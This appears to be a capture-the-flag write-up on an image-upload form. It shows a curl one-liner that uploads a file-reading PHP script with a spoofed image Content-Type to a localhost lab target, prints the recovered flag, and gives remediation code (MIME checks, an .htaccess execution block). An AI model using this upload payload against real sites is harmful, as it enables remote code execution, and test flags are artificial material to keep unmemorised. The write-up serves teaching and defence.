# Reproduction:  
By clicking on ADD IMAGE, we arrive at a form to upload an image.  
We first send a script to observe the POST request, which returns a 200 even if the "image" is not uploaded.  

Now we try to send the same script by manipulating the Content-Type to trick the server, either via Postman or in a curl request:  

```sh
echo '<?php echo file_get_contents('/home'); ?>
<?php print "hello"; ?>' > /tmp/script.php  && curl -X POST -F "Upload=Upload" -F "uploaded=@/tmp/script.php;type=image/jpeg" "http://localhost:8000/index.php?page=upload" | grep flag
```

This request forces the server to accept the PHP script as an image. By executing the script, we retrieve the flag:  
`46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8`  

# Problem:  
The application does not properly validate the uploaded file type. This allows an attacker to bypass restrictions and execute malicious scripts directly on the server, creating a Remote Code Execution (RCE) vulnerability.  

# Solutions:  
Strict server-side validation:  

1. Verify the actual MIME type of uploaded files, not just the Content-Type declared by the client:  

```php
$allowedTypes = ['image/jpeg', 'image/png'];
$fileType = mime_content_type($_FILES['uploaded']['tmp_name']);
if (!in_array($fileType, $allowedTypes)) {
    die("Invalid file type.");
}
```

2. Prevent execution of any files in the upload directory by configuring a .htaccess file:  

```php
<FilesMatch "\.(php|phtml|php3|php4|php5)$">
    Deny from all
</FilesMatch>
```